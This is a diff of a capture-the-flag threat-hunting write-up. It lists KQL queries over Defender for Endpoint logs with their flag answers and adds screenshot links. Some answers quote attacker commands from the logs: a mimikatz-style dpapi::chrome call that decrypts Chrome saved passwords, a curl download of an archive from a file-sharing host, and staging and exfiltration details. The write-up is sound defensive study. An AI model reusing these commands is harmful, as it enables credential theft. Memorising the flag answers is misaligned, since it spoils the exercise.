@@ -1,3 +1,7 @@
+###CTF-Bridge Take Over
+
+## Flag by Flag KQL & MDE Results
+
 ```
 //Flag 1 & Flag 2 & Flag 3
 DeviceLogonEvents 
@@ -155,6 +159,9 @@ DeviceProcessEvents
 // Flag 16 = OLD-Passwords.txt
 ```
 
+<img width="964" height="73" alt="image" src="https://github.com/user-attachments/assets/d75b317b-125b-4899-b94f-c5da4445b483" />
+
+
 ```
 // Flag 17
 DeviceFileEvents
@@ -167,6 +174,8 @@ DeviceFileEvents
 // Flag 17 = C:\ProgramData\Microsoft\Crypto\staging
 ```
 
+<img width="1320" height="73" alt="image" src="https://github.com/user-attachments/assets/ae7ca4e7-35ba-434c-9fed-bdcc08f64ad9" />
+
 ```
 // Flag 18
 DeviceProcessEvents
@@ -176,6 +185,9 @@ DeviceProcessEvents
 | project Timestamp,ProcessCommandLine
 // Flag 18 = "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP
 ```
+
+<img width="1057" height="104" alt="image" src="https://github.com/user-attachments/assets/f0e0a96f-4163-44ea-b7a6-80ca48dc8b53" />
+
 
 ```
 // Flag 19
@@ -187,6 +199,9 @@ DeviceFileEvents
 // Flag 19 = 8
 ```
 
+<img width="1049" height="346" alt="image" src="https://github.com/user-attachments/assets/ff0a6cf2-59d6-4473-b203-98223723c1ec" />
+
+
 ```
 // Flag 20
 DeviceProcessEvents
@@ -196,6 +211,9 @@ DeviceProcessEvents
 | project Timestamp, ProcessCommandLine, InitiatingProcessFileName
 // Flag 20 = "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z
 ```
+
+<img width="1322" height="115" alt="image" src="https://github.com/user-attachments/assets/a4f1e4a4-3a30-4482-97f6-8c67e61fe29b" />
+
 
 ```
 // Flag 21
@@ -208,6 +226,9 @@ DeviceProcessEvents
 | order by Timestamp asc
 // Flag 21 = "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit
 ```
+
+<img width="1541" height="46" alt="image" src="https://github.com/user-attachments/assets/a4fbca14-7168-47c7-9716-8ded8106cda0" />
+
 
 ```
 // Flag 22 & Flag 23
@@ -222,6 +243,9 @@ DeviceProcessEvents
 // Flag 23 = gofile.io
 ```
 
+<img width="1122" height="104" alt="image" src="https://github.com/user-attachments/assets/ccdb2a86-0fc8-4778-87fc-d4fdd38b2f1e" />
+
+
 ```
 // Flag 24
 DeviceNetworkEvents
@@ -231,6 +255,8 @@ DeviceNetworkEvents
 // Flag 24 = 45.112.123.227
 ```
 
+<img width="1085" height="61" alt="image" src="https://github.com/user-attachments/assets/bdf431b7-b326-4a19-b409-0365d881b032" />
+
 ```
 // Flag 25
 DeviceProcessEvents
@@ -239,3 +265,7 @@ DeviceProcessEvents
 | where ProcessCommandLine contains ".txt"
 | project Timestamp, ProcessCommandLine
 // Flag 25 = KeePass-Master-Password.txt
+```
+
+<img width="838" height="41" alt="image" src="https://github.com/user-attachments/assets/86cb3b16-92ff-4cc6-9953-9eb99efa9086" />
+
